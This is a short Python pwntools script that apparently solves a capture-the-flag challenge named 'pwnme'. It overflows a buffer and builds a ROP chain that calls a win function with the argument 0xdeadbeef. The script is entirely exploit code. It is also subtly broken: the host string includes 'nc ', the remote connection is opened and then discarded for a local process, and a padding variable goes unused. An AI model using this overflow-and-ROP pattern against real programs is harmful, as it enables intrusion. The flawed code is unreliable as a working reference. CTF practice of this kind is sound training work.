from pwn import *

elf = ELF("./pwnme")
host, port = "nc 0.cloud.chals.io", 10711
context.binary = elf
padd = 32*"A"
padd += 8*"B"
arg = 0xdeadbeef
win = 0x401176

rop_elf = ROP(elf)
pop_rdi = rop_elf.find_gadget(["pop rdi", "ret"]).address


p = remote(host, port)
ret = rop_elf.find_gadget(['ret']).address
payload = flat(b'A' * 40, pop_rdi, arg, ret, win,)

if args.GDB:
    p = gdb.debug(elf.path)
else:
    p = elf.process()
    p.recv()
    p.sendline(payload)
    p.interactive()
